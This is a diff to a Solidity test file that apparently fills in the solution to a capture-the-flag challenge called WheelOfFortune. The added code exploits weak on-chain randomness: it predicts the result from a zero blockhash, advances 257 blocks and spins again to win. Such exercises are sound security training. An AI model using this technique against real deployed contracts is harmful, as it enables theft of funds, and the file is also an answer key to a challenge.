@@ -15,7 +15,13 @@ contract WheelOfFortuneTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        bytes32 zeroHash = keccak256(abi.encode(bytes32(0)));
+        uint256 predictedNumber = uint256(zeroHash) % 100;
+        instance.spin{value: 0.01 ether}(predictedNumber);
+        uint256 blocksToAdvance = 257;
+        vm.roll(block.number + blocksToAdvance);
+
+        instance.spin{value: 0.01 ether}(0);
 
         checkSuccess();
     }
